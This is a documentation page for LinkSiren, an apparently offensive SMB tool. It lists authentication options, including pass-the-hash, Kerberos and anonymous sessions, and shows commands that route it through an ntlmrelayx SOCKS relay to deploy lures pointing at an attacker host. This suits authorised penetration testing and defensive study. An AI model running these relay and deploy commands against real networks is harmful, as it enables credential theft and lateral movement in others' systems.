# Authentication

All four credentialed subcommands (`rank`, `identify`, `deploy`, `cleanup`) accept the same authentication options.

| Method | Flags | Notes |
|---|---|---|
| Password | `[domain/]user:password` | Positional credentials string, the default. |
| Pass-the-Hash | `-no-pass -hashes :<NTHASH>` (or `LM:NT`) plus `[domain/]user` | Bare NT hash form accepted (the leading `:` distinguishes NT from LM). |
| Kerberos | `-no-pass -k -dc-ip <ip-or-fqdn> [domain/]user` | TGT is read from the ccache referenced by `$KRB5CCNAME`. Add `-aesKey <hex>` for AES pre-auth. Target hostnames in the targets file must be FQDNs (Kerberos service tickets bind to `cifs/<hostname>` SPNs, not IPs). If `-dc-ip` is an IP literal, linksiren will attempt to reverse-DNS it to an FQDN so the SPN can be located. |
| Anonymous (NULL session) | `--anonymous` (omit positional credentials) | Useful for share-enumeration recon against misconfigured hosts that do not require authentication. |

## Routing through a SOCKS proxy

LinkSiren uses Impacket's standard SMB connection layer, so it routes cleanly through any SOCKS proxy via `proxychains4`, including the SOCKS endpoint published by `impacket-ntlmrelayx -socks`. Typical setup:

```bash
# In one terminal: stage the relay (drop the relayed session in -socks)
impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks

# In another terminal: identify + deploy via the SOCKS endpoint
proxychains4 linksiren identify -t targets.txt [domain/]user:password
proxychains4 linksiren deploy -a <attacker> [domain/]user:password
```
